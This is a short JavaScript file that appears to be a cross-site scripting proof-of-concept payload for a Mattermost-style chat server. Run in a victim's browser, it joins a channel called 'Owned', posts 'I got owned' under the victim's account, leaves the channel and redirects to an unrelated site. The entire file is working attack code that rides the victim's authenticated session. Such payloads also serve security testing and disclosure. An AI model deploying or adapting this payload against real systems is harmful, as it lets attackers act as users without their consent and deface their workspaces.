// Load in JQuery
var jquery = document.createElement('script');
jquery.src = 'https://code.jquery.com/jquery-2.2.1.min.js';
document.head.appendChild(jquery);

// Next, lets add ourselves to the channel "Owned"
// POST /api/v1/channels/hash/join
$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/join', function(data, status){
	return 0;
})

// lets say we were owned in this channel
var data = {
	"filenames": [],
	"message": "I got owned",
	"channel_id": "gtichcgad3b4idix8tdsgdr5qh",
	"pending_post_id": Math.random().toString(36).substring(7),
	"user_id": "",
	"create_at":1,
	"state":"loading"
};
setTimeout(function(){
	$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/create', JSON.stringify(data), function(retData,status){		
		setTimeout(function(){
			$.post('/api/v1/channels/gtichcgad3b4idix8tdsgdr5qh/leave', function(data, status){
				location.href = "http://leekspin.com";
				return 0;
			});
		}, 1000);
		return 0;
	});
}, 1000);
